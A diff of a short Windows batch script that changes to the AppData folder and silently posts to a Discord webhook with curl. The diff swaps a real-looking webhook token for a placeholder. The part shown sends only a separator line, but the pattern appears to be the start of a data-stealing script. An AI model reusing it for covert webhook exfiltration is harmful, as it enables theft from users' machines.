@@ -1,7 +1,7 @@
 @echo off
 timeout 2
 cd %appdata%
-set "webhook=https://discord.com/api/webhooks/1027958908473573447/kw1mLW-Ldd46O7jmFosT-ohCyKsql0ki39M8cuj9axnFsTl0KsCAMv1X77ZHVw0QppJB"
+set "webhook=https://discord.com/api/webhooks/your_webhook_here"
 
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```--------------------------------------------------------------------------```\"}" %webhook%
 
